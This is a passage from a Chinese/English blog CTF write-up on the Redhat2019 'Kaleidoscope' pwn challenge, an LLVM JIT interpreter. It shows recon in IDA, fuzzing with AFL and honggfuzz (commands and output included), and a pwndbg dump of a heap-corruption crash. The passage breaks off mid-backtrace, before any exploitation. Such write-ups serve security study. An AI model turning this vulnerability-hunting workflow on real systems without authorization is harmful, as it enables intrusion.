<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="这是连续第三届参加广东省的红帽杯比赛了，就题目质量来说明显是一届比一届高，看到这题万花筒惊喜之余也感叹国内的CTF比赛门槛真是越来越高了。作为一道基于解释器改编的题目，通过传统的逆向方法来做还是比较困难，因此分享一下用fuzzing来找到题目漏洞以及后续的分析利用。 This challenge is from a CTF game of Guangdong province, China. It">
<meta property="og:type" content="article">
<meta property="og:title" content="[Redhat2019] Kaleidoscope">
<meta property="og:url" content="http://matshao.com/2019/11/11/Redhat2019-Kaleidoscope/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="这是连续第三届参加广东省的红帽杯比赛了，就题目质量来说明显是一届比一届高，看到这题万花筒惊喜之余也感叹国内的CTF比赛门槛真是越来越高了。作为一道基于解释器改编的题目，通过传统的逆向方法来做还是比较困难，因此分享一下用fuzzing来找到题目漏洞以及后续的分析利用。 This challenge is from a CTF game of Guangdong province, China. It">
<meta property="og:locale" content="zh-hk">
<meta property="og:updated_time" content="2019-11-11T12:27:05.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[Redhat2019] Kaleidoscope">
<meta name="twitter:description" content="这是连续第三届参加广东省的红帽杯比赛了，就题目质量来说明显是一届比一届高，看到这题万花筒惊喜之余也感叹国内的CTF比赛门槛真是越来越高了。作为一道基于解释器改编的题目，通过传统的逆向方法来做还是比较困难，因此分享一下用fuzzing来找到题目漏洞以及后续的分析利用。 This challenge is from a CTF game of Guangdong province, China. It">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2019/11/11/Redhat2019-Kaleidoscope/">





  <title> [Redhat2019] Kaleidoscope | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2019/11/11/Redhat2019-Kaleidoscope/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [Redhat2019] Kaleidoscope
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-11T20:12:48+08:00">
                2019-11-11
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这是连续第三届参加广东省的红帽杯比赛了，就题目质量来说明显是一届比一届高，看到这题万花筒惊喜之余也感叹国内的CTF比赛门槛真是越来越高了。作为一道基于解释器改编的题目，通过传统的逆向方法来做还是比较困难，因此分享一下用fuzzing来找到题目漏洞以及后续的分析利用。<br>
This challenge is from a CTF game of Guangdong province, China. It is a Pwn challenge based on llvm JIT engine. You can download this challenge at <a href="https://pan.baidu.com/s/18-GLNWmJejh-UZrK1hOQTA" target="_blank" rel="noopener">this link</a>.</p>
<a id="more"></a>
<h2 id="recon"><a class="header-anchor" href="#recon">¶</a>Recon</h2>
<p>At first you may not able to run this binary directly, because of the missing libary <code>libLLVM-6.0.so.1</code>, use <code>sudo apt-get install libllvm6.0</code> to solve the dependency. It will give us a interpreter interface like:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ready&gt; a = 1</span><br><span class="line">ready&gt; 1+1</span><br><span class="line">Error: Unknown variable name</span><br><span class="line">ready&gt; a+1</span><br><span class="line">Evaluated to 2</span><br><span class="line">ready&gt;</span><br></pre></td></tr></table></figure>
<p>Drop the binary into ida and we can see that it was written by C++, and the designer turned on some optimization settings when compiling, so the decompile result was really hard to follow. The symbols tell us, this is a Kaleidoscope JIT interpreter, which is used by llvm project as tutorial to demonstrate how to implement a JIT interpreter. We can find the tutorial here: <a href="https://llvm.org/docs/tutorial/BuildingAJIT1.html" target="_blank" rel="noopener">Building a JIT: Starting out with KaleidoscopeJIT</a>, and the source code at <a href="https://github.com/ghaiklor/llvm-kaleidoscope" target="_blank" rel="noopener">llvm-kaleidoscope</a>.</p>
<p>The main function is clear in source code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	BinopPrecedence[<span class="string">'&lt;'</span>] = <span class="number">10</span>;</span><br><span class="line">	BinopPrecedence[<span class="string">'+'</span>] = <span class="number">20</span>;</span><br><span class="line">	BinopPrecedence[<span class="string">'-'</span>] = <span class="number">20</span>;</span><br><span class="line">	BinopPrecedence[<span class="string">'*'</span>] = <span class="number">40</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ready&gt; "</span>);</span><br><span class="line">	getNextToken();</span><br><span class="line">	TheModule = llvm::make_unique&lt;Module&gt;(<span class="string">"My awesome JIT"</span>, 	TheContext);</span><br><span class="line">	MainLoop();</span><br><span class="line">	TheModule-&gt;print(errs(), <span class="literal">nullptr</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>but in ida it looks really terrible:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LLVMInitializeX86TargetInfo(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">LLVMInitializeX86Target();</span><br><span class="line">LLVMInitializeX86TargetMC();</span><br><span class="line">LLVMInitializeX86AsmPrinter();</span><br><span class="line">LLVMInitializeX86AsmParser();</span><br><span class="line">__k[<span class="number">0</span>] = <span class="string">'='</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>,<span class="built_in">std</span>::less&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">char</span> <span class="keyword">const</span>,<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>[](&amp;BinopPrecedence, __k) = <span class="number">2</span>;</span><br><span class="line">__k[<span class="number">0</span>] = <span class="string">'&lt;'</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>,<span class="built_in">std</span>::less&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">char</span> <span class="keyword">const</span>,<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>[](&amp;BinopPrecedence, __k) = <span class="number">10</span>;</span><br><span class="line">__k[<span class="number">0</span>] = <span class="string">'+'</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>,<span class="built_in">std</span>::less&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">char</span> <span class="keyword">const</span>,<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>[](&amp;BinopPrecedence, __k) = <span class="number">20</span>;</span><br><span class="line">__k[<span class="number">0</span>] = <span class="string">'-'</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>,<span class="built_in">std</span>::less&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">char</span> <span class="keyword">const</span>,<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>[](&amp;BinopPrecedence, __k) = <span class="number">20</span>;</span><br><span class="line">__k[<span class="number">0</span>] = <span class="string">'*'</span>;</span><br><span class="line">*<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>,<span class="built_in">std</span>::less&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">char</span> <span class="keyword">const</span>,<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>[](&amp;BinopPrecedence, __k) = <span class="number">40</span>;</span><br><span class="line">v3 = &amp;<span class="built_in">stderr</span>;</span><br><span class="line">fwrite(<span class="string">"ready&gt; "</span>, <span class="number">7u</span>LL, <span class="number">1u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Comparing these two pieces of code, we can see the challenge define <code>=</code> as <code>BinopPrecedence</code> while the original version didn’t. I try to follow the code but soon decide to change another method.</p>
<h2 id="fuzzing"><a class="header-anchor" href="#fuzzing">¶</a>Fuzzing</h2>
<p>So I turned to fuzzing and hope to find some bugs. I tried AFL with qemu mode to run this binary first, but it stuck on the initialization. If you know how to run such a binary with AFL, please do let me know.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">matthew@matthew-MS-7A37 /m/d/L/Fuzz&gt; afl-fuzz -i <span class="keyword">in</span>/ -o out1/ -Q -- ./wang </span><br><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line">[+] You have 8 CPU cores and 6 runnable tasks (utilization: 75%).</span><br><span class="line">[+] Try parallel <span class="built_in">jobs</span> - see /usr/<span class="built_in">local</span>/share/doc/afl/parallel_fuzzing.txt.</span><br><span class="line">[*] Checking CPU core loadout...</span><br><span class="line">[+] Found a free CPU core, binding to <span class="comment">#0.</span></span><br><span class="line">[*] Checking core_pattern...</span><br><span class="line">[*] Setting up output directories...</span><br><span class="line">[+] Output directory exists but deemed OK to reuse.</span><br><span class="line">[*] Deleting old session data...</span><br><span class="line">[+] Output dir cleanup successful.</span><br><span class="line">[*] Scanning <span class="string">'in/'</span>...</span><br><span class="line">[+] No auto-generated dictionary tokens to reuse.</span><br><span class="line">[*] Creating hard links <span class="keyword">for</span> all input files...</span><br><span class="line">[*] Validating target binary...</span><br><span class="line">[*] Attempting dry run with <span class="string">'id:000000,orig:1.txt'</span>...</span><br><span class="line">[*] Spinning up the fork server...</span><br><span class="line">[+] All right - fork server is up.</span><br><span class="line">...(It just stop here)</span><br></pre></td></tr></table></figure>
<p>Then I try honggfuzz, which is another popular fuzzer support binary instrument.  At first I cloned the source code from github but failed on compilation. Then I found a docker image at <a href="https://hub.docker.com/r/zjuchenyuan/honggfuzz" target="_blank" rel="noopener">Doker hub</a>, but it does not support qemu mode. I had to attach to the container and complied the qemu mode, some dependencies installation are unavoidable. It took me more than 2 hours to setup this tool (the network connection is always big problem when you setting up similar tools in China).</p>
<p>The command of running this docker image is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -it -v (<span class="built_in">pwd</span>):/work --privileged zjuchenyuan/honggfuzz:latest /bin/bash</span><br></pre></td></tr></table></figure>
<p>and you can find the usage of honggfuzz here: <a href="https://github.com/google/honggfuzz/blob/master/docs/USAGE.md" target="_blank" rel="noopener">USAGE</a>, for the qemu mode we need, it can be run by:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">honggfuzz -f /work/<span class="keyword">in</span>/ -s -- ./qemu_mode/honggfuzz-qemu/x86_64-linux-user/qemu-x86_64 /work/kaleidoscope</span><br></pre></td></tr></table></figure>
<p>The seed corpus was put in <code>/work/in</code>, I simply chose the code snippet from <a href="https://llvm.org/docs/tutorial/OCamlLangImpl1.html#the-basic-language:" target="_blank" rel="noopener">https://llvm.org/docs/tutorial/OCamlLangImpl1.html#the-basic-language:</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Compute the x'th fibonacci number.</span><br><span class="line"><span class="function">def <span class="title">fib</span><span class="params">(x)</span></span></span><br><span class="line">  if x &lt; 3 then</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fib(x<span class="number">-1</span>)+fib(x<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"># This expression will compute the <span class="number">40</span>th number.</span><br><span class="line">fib(<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<p>I run this in a vmware workstation vm, so the speed is a kind of slow, but it still give us some crashes in less than ten minutes. I believe this will be much faster on a bare metal linux machine.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> Iterations : 5810 [5.81k]</span><br><span class="line"> Mode [3/3] : Feedback Driven Mode</span><br><span class="line">     Target : ./qemu_mode/honggfuzz-qemu/x86_6.....u-x86_64 /work/kaleidoscope</span><br><span class="line">    Threads : 4, CPUs: 8, CPU%: 424% [53%/CPU]</span><br><span class="line">      Speed : 0/sec [avg: 1]</span><br><span class="line">    Crashes : 200 [unique: 0, blacklist: 0, verified: 0]</span><br><span class="line">   Timeouts : 0 [10 sec]</span><br><span class="line">Corpus Size : 97, max: 8192 bytes, init: 2 files</span><br><span class="line"> Cov Update : 0 days 00 hrs 01 mins 18 secs ago</span><br><span class="line">   Coverage : edge: 3922/45011 [8%] pc: 1541 cmp: 135658</span><br></pre></td></tr></table></figure>
<h2 id="crashes"><a class="header-anchor" href="#crashes">¶</a>Crashes</h2>
<p>The fuzzer gave us a crash in less than ten minutes, I review the crashes, it seems like some heap corruption issue, but the stacktrace was hard to look at.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x7ffff399b840</span> (<span class="built_in">stderr</span>) —▸ <span class="number">0x7ffff399b680</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"> RCX  <span class="number">0x7ffff35ede97</span> (raise+<span class="number">199</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x108</span>]</span><br><span class="line"> RDX  <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x2</span></span><br><span class="line"> RSI  <span class="number">0x7fffffffd660</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x7fffffffd660</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x8</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x5555556030b0</span> —▸ <span class="number">0x5555555d4fd0</span> —▸ <span class="number">0x5555555d5040</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R13  <span class="number">0x7ffff3ff9550</span> (<span class="built_in">std</span>::bad_alloc::~bad_alloc()) ◂— mov    rax, qword ptr [rip + <span class="number">0x3390f1</span>]</span><br><span class="line"> R14  <span class="number">0x55555569ec40</span> —▸ <span class="number">0x5555555ef820</span> —▸ <span class="number">0x5555555c70e0</span> —▸ <span class="number">0x5555555f7700</span> —▸ <span class="number">0x5555555f76c0</span> ◂— ...</span><br><span class="line"> R15  <span class="number">0x55555569ec30</span> —▸ <span class="number">0x55555569ec40</span> —▸ <span class="number">0x5555555ef820</span> —▸ <span class="number">0x5555555c70e0</span> —▸ <span class="number">0x5555555f7700</span> ◂— ...</span><br><span class="line"> RBP  <span class="number">0x7ffff40dbfe2</span> ◂— jae    <span class="number">0x7ffff40dc058</span> <span class="comment">/* u'std::bad_alloc' */</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffd660</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RIP  <span class="number">0x7ffff35ede97</span> (raise+<span class="number">199</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x108</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff35ede97</span> &lt;raise+<span class="number">199</span>&gt;    mov    rcx, qword ptr [rsp + <span class="number">0x108</span>] &lt;<span class="number">0x7ffff35ede97</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff35ede9f</span> &lt;raise+<span class="number">207</span>&gt;    xor    rcx, qword ptr fs:[<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7ffff35edea8</span> &lt;raise+<span class="number">216</span>&gt;    mov    eax, r8d</span><br><span class="line">   <span class="number">0x7ffff35edeab</span> &lt;raise+<span class="number">219</span>&gt;    jne    raise+<span class="number">252</span> &lt;<span class="number">0x7ffff35edecc</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff35edecc</span> &lt;raise+<span class="number">252</span>&gt;    call   __stack_chk_fail &lt;<span class="number">0x7ffff36e3c80</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff35eded1</span>                nop    word ptr cs:[rax + rax]</span><br><span class="line">   <span class="number">0x7ffff35ededb</span>                nop    dword ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7ffff35edee0</span> &lt;killpg&gt;       test   edi, edi</span><br><span class="line">   <span class="number">0x7ffff35edee2</span> &lt;killpg+<span class="number">2</span>&gt;     js     killpg+<span class="number">16</span> &lt;<span class="number">0x7ffff35edef0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff35edee4</span> &lt;killpg+<span class="number">4</span>&gt;     neg    edi</span><br><span class="line">   <span class="number">0x7ffff35edee6</span> &lt;killpg+<span class="number">6</span>&gt;     jmp    <span class="number">0x7ffff35ee180</span> &lt;<span class="number">0x7ffff35ee180</span>&gt;</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi r9 rsp  <span class="number">0x7fffffffd660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7fffffffd668</span> —▸ <span class="number">0x7ffff399b420</span> (main_arena+<span class="number">2016</span>) —▸ <span class="number">0x55555567aa60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7fffffffd670</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff35ede97 raise+<span class="number">199</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff35ef801 <span class="built_in">abort</span>+<span class="number">321</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">7f</span>fff3fef242</span><br><span class="line">   f <span class="number">3</span>     <span class="number">7f</span>fff3ffae86</span><br><span class="line">   f <span class="number">4</span>     <span class="number">7f</span>fff3ffaed1</span><br><span class="line">   f <span class="number">5</span>     <span class="number">7f</span>fff3ffb105</span><br><span class="line">   f <span class="number">6</span>     <span class="number">7f</span>fff3feeee1</span><br><span class="line">   f <span class="number">7</span>     <span class="number">55555555</span>eb68</span><br><span class="line">   f <span class="number">8</span>     <span class="number">55555555</span>eb68</span><br><span class="line">   f <span class="number">9</span>     <span class="number">55555555</span>eb68</span><br><span class="line">   f <span class="number">10</span>     <span class="number">55555555</span>eb68</span><br><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  __GI_raise (sig=sig@entry=<span class="number">6</span>) at ../sysdeps/unix/sysv/linux/raise.c:<span class="number">51</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007ffff35ef801</span> in __GI_abort () at <span class="built_in">abort</span>.c:<span class="number">79</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007ffff3fef242</span> in ?? () from /usr/lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007ffff3ffae86</span> in ?? () from /usr/lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007ffff3ffaed1</span> in <span class="built_in">std</span>::terminate() () from /usr/lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span></span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007ffff3ffb105</span> in __cxa_throw () from /usr/lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007ffff3feeee1</span> in ?? () from /usr/lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x000055555555eb68</span> in <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;::_M_construct&lt;<span class="keyword">char</span>*&gt; (<span class="keyword">this</span>=&lt;optimized out&gt;, __beg=<span class="number">0x6</span> &lt;error: Cannot access memory at address <span class="number">0x6</span>&gt;, __end=&lt;optimized out&gt;) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/basic_string.tcc:<span class="number">219</span></span><br><span class="line">#<span class="number">8</span>  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt; &gt;::_M_construct_aux&lt;<span class="keyword">char</span>*&gt; (<span class="keyword">this</span>=&lt;optimized out&gt;, __beg=<span class="number">0x6</span> &lt;error: Cannot access memory at address <span class="number">0x6</span>&gt;, __end=&lt;optimized out&gt;) at /usr/bin/../lib/gcc/x86_64-linux-gnu/<span class="number">7.4</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.4</span><span class="number">.0</span>/bits/basic_string.h:<span class="number">236</span></span><br><span class="line">#<span class="number">9</span>  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span 